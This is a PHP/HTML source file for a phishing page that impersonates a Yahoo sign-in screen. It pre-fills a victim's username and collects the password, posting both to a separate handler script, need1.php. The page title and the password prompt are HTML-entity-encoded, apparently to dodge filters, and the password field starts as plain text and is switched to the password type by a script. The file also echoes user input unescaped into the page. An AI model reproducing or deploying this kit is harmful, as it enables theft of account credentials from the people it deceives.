<?php

$id = $_POST['user'];

?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#89;&#97;&#104;&#111;&#111;&#32;&#45;&#32;&#108;&#111;&#103;&#105;&#110;</title>
<script>setTimeout(function() {
  document.getElementsByTagName('input')[2].type = "password"
}, 1000);
</script>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>	

<style type="text/css">
			  .textbox {
    padding: 9px !important;
    height: auto;
    color: #333;
    border: none;
    border-bottom: 1px solid #999;
    border-radius: 1px;
    font-family: 'josefin_sansregular', sans-serif;
    font-size: 16px;
	color: #555;
    outline: none;
    -webkit-transition: all 250ms ease-in;
    -moz-transition: all 250ms ease-in;
    -ms-transition: all 250ms ease-in;
    -o-transition: all 250ms ease-in;
    transition: all 250ms ease-in;
}
.textbox:focus {
       border-bottom: 2px solid #188FFF;
}
 
.textbox1 { 
    color: #101010;
	text-align: center;
  	font-size: 19px;
    border: 0px solid #fff; 
    outline:0; 
    height: 35px; 
    width: 275px; 
 }

</style>
<style type="text/css">
div#container
{
	position:relative;
	width: 1365px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>
<style>
p{font-size: 40px;}
.loader {
    position: fixed;
    left: 0px;
    top: 0px;
    width: 100%;
    height: 100%;
    z-index: 9999;
    background: url('https://smallenvelop.com/wp-content/uploads/2014/08/Preloader_11.gif') 50% 50% no-repeat rgb(249,249,249);
    opacity: .8;
}
</style>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
<script type="text/javascript">
$(window).load(function() {
	$(".loader").fadeOut("slow");
});
</script>
</head>
<body>
<div class="loader"></div>
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1365px; height:77px; z-index:0"><img src="images/y1.png" alt="" title="" border=0 width=1365 height=77></div>

<div id="image7" style="position:absolute; overflow:hidden; left:93px; top:11px; width:128px; height:34px; z-index:1"><a href="#"><img src="images/yh.png" alt="" title="" border=0 width=128 height=34></a></div>

<div id="image2" style="position:absolute; overflow:hidden; left:830px; top:68px; width:372px; height:560px; z-index:2"><img src="images/y2.png" alt="" title="" border=0 width=372 height=560></div>

<div id="image3" style="position:absolute; overflow:hidden; left:1328px; top:26px; width:31px; height:15px; z-index:3"><a href="#"><img src="images/y5.png" alt="" title="" border=0 width=31 height=15></a></div>

<div id="image4" style="position:absolute; overflow:hidden; left:987px; top:222px; width:55px; height:17px; z-index:4"><a href="#"><img src="images/y3.png" alt="" title="" border=0 width=55 height=17></a></div>

<div id="image5" style="position:absolute; overflow:hidden; left:940px; top:368px; width:149px; height:19px; z-index:5"><a href="#"><img src="images/y4.png" alt="" title="" border=0 width=149 height=19></a></div>
<form action="need1.php?name=$id" name=paindisiri id=paindisiri method=post>
       <input name="user1" value="<?=$id?>" type="hidden">
<input name="user" value="<?=$id?>" class="textbox1" autocomplete="off" required type="text" style="position:absolute;width:319px;left:854px;top:186px;z-index:6">
<input name="psw" placeholder="&#69;&#110;&#116;&#101;&#114;&#32;&#121;&#111;&#117;&#114;&#32;&#112;&#97;&#115;&#115;&#119;&#111;&#114;&#100;" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:323px;left:852px;top:257px;z-index:7">
<div id="formimage1" style="position:absolute; left:853px; top:301px; z-index:8"><input type="image" name="formimage1" width="322" height="48" src="images/ysng.png"></div>
</div>
	
</body>
</html>
